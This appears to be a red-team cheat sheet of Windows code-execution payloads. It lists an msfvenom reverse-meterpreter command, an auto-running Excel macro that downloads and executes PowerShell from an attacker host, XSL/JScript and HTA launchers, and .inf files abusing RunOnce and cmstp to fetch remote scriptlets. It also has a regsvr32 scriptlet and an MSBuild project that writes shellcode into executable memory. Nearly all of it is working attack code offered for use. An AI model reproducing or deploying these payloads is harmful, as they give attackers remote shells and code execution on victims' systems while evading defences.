██ Excel

    ▒▒ Shell

        ~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=VAR_ATTACKER_HOST lport=443 -f psh-reflection > script.ps1

    ▒▒ Script

        Sub Execute()
        Dim payload
        payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://VAR_ATTACKER_HOST/script.ps1'));"
        Call Shell(payload, vbHide)
        End Sub
        Sub Auto_Open()
        Execute
        End Sub
        Sub Workbook_Open()
        Execute
        End Sub

██ MSXML

    ▒▒ .xml

        <?xml version='1.0'?>
        <stylesheet
        xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
        xmlns:user="placeholder"
        version="1.0">
        <output method="text"/>
            <ms:script implements-prefix="user" language="JScript">
            <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
            ]]> </ms:script>
        </stylesheet>
        <?xml version="1.0"?>
        <command>
           <a>
              <execute>iex notepad.exe</execute>
           </a>
        </command>

    ▒▒ .xsl

        <?xml version='1.0'?>
        <!-- msxsl.exe poc.xml poc.xml -->
        <stylesheet
        xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
        xmlns:user="placeholder"
        version="1.0">
        <output method="text"/>
            <ms:script implements-prefix="user" language="JScript">
            <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
            ]]> </ms:script>
        <template match="/*">
        <apply-templates select="*"/>
        </template>
        </stylesheet>

██ .inf

    ; DRIVER.INF
    ; Copyright (c) Microsoft Corporation.  All rights reserved.

    [Version]
    Signature = "$CHICAGO$"
    Class=61883
    ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17}
    Provider=%Msft%
    DriverVer=06/21/2006,6.1.7600.16385

    [DestinationDirs]
    DefaultDestDir = 1

    [DefaultInstall]
    AddReg = CalcStart

    [CalcStart]
    HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe"""

██ .url

    [InternetShortcut]
    URL=file:///c:\windows\system32\calc.exe

██ .hta

    <html><head><script>
    a=new ActiveXObject("WScript.Shell");
    a.run('%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();
    </script></head></html>

██ .inf

    ;cmstp.exe /s cmstp.inf

    [version]
    Signature=$chicago$
    AdvancedINF=2.5

    [DefaultInstall_SingleUser]
    UnRegisterOCXs=UnRegisterOCXSection

    [UnRegisterOCXSection]
    %11%\scrobj.dll,NI,https://gist.githubusercontent.com/bohops/6ded40c4989c673f2e30b9a6c1985019/raw/33dc4cae00a10eb86c02b561b1c832df6de40ef6/test.sct

    [Strings]
    AppAct = "SOFTWARE\Microsoft\Connection Manager"
    ServiceName="Yay"
    ShortSvcName="Yay"

██ .sct

    <?XML version="1.0"?>
    <scriptlet>
    <registration
        description="Bandit"
        progid="Bandit"
        version="1.00"
        classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
        >
        <!-- regsvr32 /s /n /u /i:http://VAR_TARGET_HOST/file.sct scrobj.dll
        <!-- DFIR -->
        <!--        .sct files are downloaded and executed from a path like this -->
        <!-- Though, the name and extension are arbitary.. -->
        <!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct -->
        <!-- Based on current research, no registry keys are written, since call "uninstall" -->
        <!-- Proof Of Concept - Casey Smith @subTee -->
            <!-- @RedCanary - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct -->
        <script language="JScript">
            <![CDATA[
                var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
            ]]>
        </script>
    </registration>
    <public>
        <method name="Exec"></method>
    </public>
    <script language="JScript">
    <![CDATA[
        function Exec()
        {
            var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
        }
    ]]>
    </script>
    </scriptlet>

██ Assembly reflection

    <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" >
        <Target Name="Hello" >
        <!-- Call ANY .NET API -->
        <!--
            Author: Casey Smith, Twitter: @subTee
            License: BSD 3-Clause
            Full Working Details Here: https://www.youtube.com/watch?v=-sUXMzkh-jI
        -->
        <!--  set MSBUILDENABLEALLPROPERTYFUNCTIONS=1 -->
        <!--
        $env:MSBUILDENABLEALLPROPERTYFUNCTIONS = 1
        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe poc.png

        byte[] shellcode = new byte[272] {
        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
        0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
        0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
        0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
        0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
        0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
        0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
        0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
        0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
        0x63,0x00 };
        -->
        <!--  Debug List Assemblies
        <CreateItem Include="$([System.AppDomain]::CurrentDomain.GetAssemblies())" >
            <Output TaskParameter="Include" ItemName="TypeItems"/>
        </CreateItem>
        <Message Text="%(TypeItems.Identity)" />
        -->
        <!-- Load Some Assemblies -->
        <Message Text="$([System.Reflection.Assembly]::Load('System.IO') )" />
        <Message Text="$([System.Reflection.Assembly]::Load('System.IO.MemoryMappedFiles') )" />
        <Message Text="$([System.Reflection.Assembly]::Load('System.Runtime.InteropServices') )" />
        <PropertyGroup>
            <!--GUID -->
            <MappedFileName>1c9360ac-dc0d-4cd8-bf32-c4380855b733</MappedFileName>
            <Shellcode>/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYwA=</Shellcode>
            <CreateMemoryMappedFile>$([System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew($(MappedFileName), $([System.Int64]::Parse(272)),$([System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute)))</CreateMemoryMappedFile>
            <WriteToMemoryMappedFile>$([System.IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting($(MappedFileName), $([System.IO.MemoryMappedFiles.MemoryMappedFileRights]::FullControl)).CreateViewStream().Write($([System.Convert]::FromBase64String($(Shellcode))), 0, 272) )</WriteToMemoryMappedFile>
            <!-- Example To Return an IntPtr -->
            <GetRWXIntPtrMemoryMappedFile>$([System.IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting($(MappedFileName), $([System.IO.MemoryMappedFiles.MemoryMappedFileRights]::FullControl)).CreateViewStream( $([System.Int64]::Parse(0)), $([System.Int64]::Parse(272)), $([System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute)).SafeMemoryMappedViewHandle.DangerousGetHandle().ToString("X"))</GetRWXIntPtrMemoryMappedFile>
        </PropertyGroup>
        <Message Text="$(GetTypePrimitive)" />
        <Message Text="$(CreateMemoryMappedFile)" />
        <Message Text="$(GetRWXIntPtrMemoryMappedFile)" />
        <Message Text="$([System.Console]::ReadLine())" />
      </Target>
    </Project>

